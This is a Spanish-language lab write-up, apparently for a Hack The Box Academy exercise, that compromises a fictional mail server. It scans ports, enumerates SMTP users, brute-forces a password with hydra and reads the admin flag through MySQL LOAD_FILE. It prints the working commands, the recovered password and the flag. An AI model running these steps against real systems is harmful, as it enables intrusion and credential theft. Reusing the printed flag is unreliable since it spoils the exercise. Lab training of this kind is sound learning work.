
# Lab - Easy

## <mark style="color:purple;">Introducción</mark>

La empresa Inlanefreight nos encargó realizar una prueba de penetración en 3 hosts diferentes para comprobar la configuración y la seguridad de los servidores. Se nos informó que se había colocado una flag en algún lugar de cada servidor para demostrar el acceso exitoso. Estas flags tienen el siguiente formato:

```
HTB{...} 
```

Nuestra tarea es revisar la seguridad de cada uno de los tres servidores y presentársela al cliente. Según nuestra información, el primer servidor es un servidor que gestiona los correos electrónicos, los clientes y sus archivos.

> Su objetivo es el dominio `inlanefreight.htb`. Evalúa el servidor de destino y obtén el contenido del archivo flag.txt en el escritorio del administrador.

***

## <mark style="color:purple;">Primer acceso</mark>

```bash
sudo nmap -v -sV -Pn -T5 10.129.183.68

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp
25/tcp   open  smtp          hMailServer smtpd
80/tcp   open  http          Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/7.4.29)
443/tcp  open  https
587/tcp  open  smtp          hMailServer smtpd
3306/tcp open  mysql         MySQL 5.5.5-10.4.24-MariaDB
3389/tcp open  ms-wbt-server Microsoft Terminal Services
```

Encontramos varios puertos abiertos, entre ellos el 25 SMTP, por lo que probaremos a hacer una enumeración de usuarios.

## <mark style="color:purple;">Acceso web</mark>

Si accedemos por el puerto 80 nos encontramos el servicio web:

<figure><img src="/files/RGWOxPj2INJqvROJlpqt" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/XuwGWrMgTwx4U0tOMMRt" alt=""><figcaption></figcaption></figure>

El admin está protegido con contraseña, así que no podemos acceder por aquí.

## <mark style="color:purple;">Enumeración de usuarios</mark>

Vamos a usar `smtp-user-enum` para enumerar usuarios válidos para SMTP:

```bash
smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.203.7
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... RCPT
Worker Processes ......... 5
Usernames file ........... users.list
Target count ............. 1
Username count ........... 79
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ inlanefreight.htb

######## Scan started at Tue Apr 30 15:35:33 2024 #########
10.129.183.68: fiona@inlanefreight.htb exists
######## Scan completed at Tue Apr 30 15:36:22 2024 #########
1 results.
```

Encontramos 1 usuario de SMTP: `fiona@inlanefreight.htb`

## <mark style="color:purple;">Bruteforce</mark>

Vamos a hacer bruteforce de SMTP  para averiguar la contraseña de Fiona:

```
hydra -l fiona@inlanefreight.htb -P /usr/share/wordlists/rockyou.txt -t 64 -f 10.129.203.7 smtp
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-04-30 17:58:46
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking smtp://10.129.203.7:25/
[25][smtp] host: 10.129.203.7   login: fiona@inlanefreight.htb   password: 987654321
[STATUS] attack finished for 10.129.203.7 (valid pair found)
```

Buum!! Tenemos la contraseña:

```
fiona@inlanefreight.htb
987654321
```

## <mark style="color:purple;">Conexión a MySQL</mark>

Como hemos visto tenemos una base de datos MySQL disponible, por lo que vamos a acceder como Fiona para ver que encontramos:

```bash
mysql -u fiona -p -h 10.129.203.7 --skip-ssl

Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 14
Server version: 10.4.24-MariaDB mariadb.org binary distribution

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| phpmyadmin         |
| test               |
+--------------------+
5 rows in set (0,072 sec)

MariaDB [(none)]> 
```

Conseguimos acceder correctamente a la base de datos, por lo que vamos a buscar información relevante.

Después de enumerar todas las bases de datos no encontramos nada relevante, por lo que vamos a intentar leer la flag directamente con `LOAD_FILE`:

```sql
MariaDB [(none)]> SELECT LOAD_FILE("C:/Users/Administrator/Desktop/flag.txt");
+------------------------------------------------------+
| LOAD_FILE("C:/Users/Administrator/Desktop/flag.txt") |
+------------------------------------------------------+
| HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}              |
+------------------------------------------------------+
1 row in set (2 min 3,125 sec)

MariaDB [(none)]>
```

Ha funcionado y conseguimos leer la flag correctamente! 🏆
